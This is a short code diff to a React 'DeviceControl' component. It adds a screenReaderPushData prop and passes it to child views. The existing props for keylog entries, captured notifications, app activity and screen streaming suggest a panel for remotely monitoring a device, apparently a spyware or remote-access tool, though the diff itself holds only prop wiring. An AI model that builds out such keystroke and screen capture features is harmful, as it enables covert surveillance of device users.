@@ -36,7 +36,7 @@ const TABS = [
   { id: 'gestures',      label: '✋ Gestures' },
 ];
 
-export default function DeviceControl({ device, sendCommand, results, pending, onBack, streamFrame, send, keylogPushEntries, notifPushEntries, activityAppEntries, serverLatency, deviceLatency }) {
+export default function DeviceControl({ device, sendCommand, results, pending, onBack, streamFrame, send, keylogPushEntries, notifPushEntries, activityAppEntries, screenReaderPushData, serverLatency, deviceLatency }) {
   const [activeTab, setActiveTab] = useState('control_center');
   const info     = device.deviceInfo || {};
   const isOnline = device.isOnline;
@@ -121,6 +121,7 @@ export default function DeviceControl({ device, sendCommand, results, pending, o
             serverLatency={serverLatency}
             deviceLatency={deviceLatency}
             onTabChange={setActiveTab}
+            screenReaderPushData={screenReaderPushData}
           />
         </div>
       )}
@@ -161,6 +162,7 @@ export default function DeviceControl({ device, sendCommand, results, pending, o
           device={device}
           sendCommand={sendCommand}
           results={results}
+          screenPushData={screenReaderPushData}
         />
       )}
 
